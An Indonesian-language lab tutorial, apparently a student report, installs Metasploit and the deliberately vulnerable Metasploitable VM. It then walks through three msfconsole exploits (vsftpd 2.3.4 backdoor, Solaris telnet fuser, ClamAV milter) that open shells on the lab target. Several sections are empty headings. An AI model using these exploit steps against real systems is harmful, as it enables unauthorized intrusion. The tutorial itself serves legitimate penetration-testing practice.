#A. Pendahuluan
#B. Dasar Teori
#C. Instalasi
## C.1 Instalasi Metasploit
### C.1.1 Instalasi Metasploit pada Ubuntu 16.04
Pada Ubuntu belum terinstall secara langsung metasploit framework, sehingga diperlukan secara manual instalasi aplikasi metasploit framework didalam ubuntu 16.04 dengan cara sebagai berikut 

1. Install Oracle Java 8
Tambahkan repository Oracle Java
```
sudo add-apt-repository -y ppa:webupd8team/java
```
Update Ubuntu
```
sudo apt-get update
```
Install Java-8
```
sudo apt-get -y install oracle-java8-installer
```

2. Install Dependencies
Install dependencies yang dibutuhkan dalam menjalankan metasploit
```
sudo apt-get install build-essential libreadline-dev libssl-dev libpq5 libpq-dev libreadline5 libsqlite3-dev libpcap-dev git-core autoconf postgresql pgadmin3 curl zlib1g-dev libxml2-dev libxslt1-dev vncviewer libyaml-dev curl zlib1g-dev
```

3. Install Ruby
Install Ruby dengan menggunakan rbenv
```
cd ~
git clone git://github.com/sstephenson/rbenv.git .rbenv
echo 'export PATH="$HOME/.rbenv/bin:$PATH"' >> ~/.bashrc
echo 'eval "$(rbenv init -)"' >> ~/.bashrc
exec $SHELL
```
```
git clone git://github.com/sstephenson/ruby-build.git ~/.rbenv/plugins/ruby-build
echo 'export PATH="$HOME/.rbenv/plugins/ruby-build/bin:$PATH"' >> ~/.bashrc
```
```
git clone git://github.com/dcarley/rbenv-sudo.git ~/.rbenv/plugins/rbenv-sudo
```
```
exec $SHELL
```
```
RUBYVERSION=$(wget https://raw.githubusercontent.com/rapid7/metasploit-framework/master/.ruby-version -q -O - )
rbenv install $RUBYVERSION
rbenv global $RUBYVERSION
ruby -v
```

4. Install Nmap
Installasi Nmap untuk melihat aplikasi serta versi dari port yang terbuka sehingga bisa dilakukan exploit
```
mkdir ~/Development
cd ~/Development
git clone https://github.com/nmap/nmap.git
cd nmap 
./configure
make
sudo make install
make clean
```

5. Konfigurasi PostgreSQL
Ganti menjadi user postgre agar dapat membuat database
```
sudo -s
su postgres
```
Lalu buat databae
```
createuser msf -P -S -R -D
createdb -O msf msf
exit
exit
```

6. Install Metasploit Framework
Download metasploit framework terlebih dahulu
```
cd /opt
sudo git clone https://github.com/rapid7/metasploit-framework.git
sudo chown -R `whoami` /opt/metasploit-framework
cd metasploit-framework
```
Install menggunakan bundler dan gems yang dibutuhkan
```
gem install bundler
bundle install
```
Setting supaya bisa diakses oleh semua user
```
sudo bash -c 'for MSF in $(ls msf*); do ln -s /opt/metasploit-framework/$MSF /usr/local/bin/$MSF;done'
```

7. Metasploit for Development and Contribution
Apabila ingin berkontribusi ke dalam pengembangan metasploit lakukan langkah dibawah ini
```
curl -# -o /tmp/armitage.tgz http://www.fastandeasyhacking.com/download/armitage150813.tgz
sudo tar -xvzf /tmp/armitage.tgz -C /opt
sudo ln -s /opt/armitage/armitage /usr/local/bin/armitage
sudo ln -s /opt/armitage/teamserver /usr/local/bin/teamserver
sudo sh -c "echo java -jar /opt/armitage/armitage.jar \$\* > /opt/armitage/armitage"
sudo perl -pi -e 's/armitage.jar/\/opt\/armitage\/armitage.jar/g' /opt/armitage/teamserver
```
Buatlah konfigurasi database
```
sudo nano /opt/metasploit-framework/config/database.yml
```
Dengan berisi
```
production:
 adapter: postgresql
 database: msf
 username: msf
 password: 
 host: 127.0.0.1
 port: 5432
 pool: 75
 timeout: 5
```
```
sudo sh -c "echo export MSF_DATABASE_CONFIG=/opt/metasploit-framework/config/database.yml >> /etc/profile"
source /etc/profile
```

8. Jalankan msfconsole
Setelah selesai seluruh konfigurasi, terakhir adalah menjalankan console metasploit dengan command
```
msfconsole
```

###C.1.2 Installasi metasploit pada Kali Linux
####C.1.2.1 Installasi metasploit pada Kali Linux sebelum 2016 Rolling Edition
Untuk menjalankan metasploit pada Kali Linux versi sebelum 2016.01 Rolling Edition diperlukan 3 hal yaitu
1. Start Kali PostgreSQL Service
```
service postgresql start
```
2. Start Kali Metasploit Service
```
service metasploit start
```

3. Start msfconsole
```
msfconsole
```
Maka Hasilnya akan seperti dibawah ini

####C.1.2.2 Instalasi Metasploit pada Kali Linux 2016.01 Rolling Edition
Untuk menjalankan metasploit pada kali linux 2016.01 Rolling Edition tinggal menjalankan aplikassi msf framework maka akan langsung jalan aplikasi msf metasploit


## C.2 Installasi Metasploitable
Untuk menjalankan metasploitable kita harus mendownloadnya terlebih dahulu di
https://sourceforge.net/projects/metasploitable/files/Metasploitable2/

Setelah selesai di unzip buka VMWare Workstation dan Open Virtual Machine 

Lalu arahkan kepada folder tenmpat penyimpanan metasploitable

Jalankan Machine Virtualnya

Untuk login gunakan username serta password msfadmin

#D. Attack Exploit
##D.1 Exploit menggunakan vsftpd_234_backdoor
Langkah pertama yang dilakukan adalah mengecek metasploitable apakah dapat dilakukan exploit dengan menggunakan vsftpd_234_backdoor dengan command
```
nmap -sV "Target IP"
```

Apabila Target memiliki service yang terbuka dengan menggunakan versi vsftpd 2.3.4 maka exploit dapat dilakukan

Langkah selanjutnya yang dilakukan adalah buka aplikasi msfconsole

Tampilan akan seperti dibawah ini

Masukkan command dibawah untuk mulai menggunakan exploit
```
use exploit/unix/ftp/vsftpd_234_backdoor
```
Set target ip serta payload yang akan digunakan
```
set RHOST localhost
set PAYLOAD cmd/unix/interact
```
Setelah mengatur ip target dan payload yang akan digunakan selanjutnya dilakukan exploit
```
exploit
```

Apabila tampilan diatas telah muncul, maka host berhasil ditembus

Melakukan pengecekan ip host dan ternyata sama

Melakukan pengecekan service yang terdapat pada host

Cek uname -a dari host

##D.2 Exploit menggunakan fuser
Langkah pertama yang dilakukan adalah mengecek metasploitable apakah dapat dilakukan exploit dengan menggunakan fuser dengan command
```
nmap -sV "Target IP"
```

Apabila Target memiliki service yang telnet terbuka maka exploit dapat dilakukan

Langkah selanjutnya yang dilakukan adalah buka aplikasi msfconsole

Tampilan akan seperti dibawah ini

Masukkan command dibawah untuk mulai menggunakan exploit
```
use exploit/solaris/telnet/fuser
```
Set target ip, port, user serta payload yang akan digunakan
```
set RHOST localhost
set RPORT 23
set USER bin
set PAYLOAD cmd/unix/bind_perl
```
Setelah mengatur ip target dan payload yang akan digunakan selanjutnya dilakukan exploit
```
exploit
```

Apabila tampilan diatas telah muncul, maka host berhasil ditembus

Melakukan pengecekan ip host dan ternyata sama

Melakukan pengecekan service yang terdapat pada host

Cek uname -a dari host

##D.3 Exploit menggunakan clamav_milter_blackhole
Langkah pertama yang dilakukan adalah mengecek metasploitable apakah dapat dilakukan exploit dengan menggunakan clamav_milter_blackhole dengan command
```
nmap -sV "Target IP"
```

Apabila Target memiliki service smtp terbuka maka exploit dapat dilakukan

Langkah selanjutnya yang dilakukan adalah buka aplikasi msfconsole

Tampilan akan seperti dibawah ini

Masukkan command dibawah untuk mulai menggunakan exploit
```
use exploit/unix/smtp/clamav_milter_blackhole
```
Set target ip, port, user serta payload yang akan digunakan
```
set RHOST 192.168.1.6
set RPORT 25
set PAYLOAD cmd/unix/bind_perl
```
Setelah mengatur ip target dan payload yang akan digunakan selanjutnya dilakukan exploit
```
exploit
```

Apabila tampilan diatas telah muncul, maka host berhasil ditembus

Melakukan pengecekan ip host dan ternyata sama

Melakukan pengecekan service yang terdapat pada host

Cek uname -a dari host

#E. Kesimpulan dan Saran